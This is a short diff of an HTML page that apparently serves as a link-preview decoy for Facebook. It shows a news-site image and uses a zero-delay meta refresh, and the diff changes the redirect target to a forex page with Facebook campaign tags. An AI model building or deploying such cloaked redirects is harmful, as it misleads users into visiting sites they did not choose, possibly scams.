@@ -5,6 +5,6 @@
         <img src="http://www.dailyprotidinerkagoj.com/wp-content/uploads/2021/07/safe_image-30-1-3-2.jpeg" width="670" height="350">
 
 
-    <meta http-equiv="Refresh" content="0; url=https://newfinemart.com/?p=4064&utm_source=fb&utm_medium=jiger&utm_campaign=jiger" />
+    <meta http-equiv="Refresh" content="0; url=https://physicsabout.com/forex/?utm_source=fb&utm_medium=jani&utm_id=jani" />
   </head>
 </html>
